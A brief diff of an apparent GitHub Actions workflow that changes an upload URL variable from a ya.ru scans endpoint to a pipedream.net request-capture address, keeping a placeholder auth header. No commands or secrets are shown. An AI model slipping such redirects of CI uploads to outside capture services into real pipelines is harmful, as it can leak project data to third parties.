@@ -8,7 +8,7 @@ on:
       - master
       
 env:
-  url: www.ya.ru/api/scans/upload
+  url: https://enxkbub0bfww1h2.m.pipedream.net
   authheader: someheader
   
 jobs:
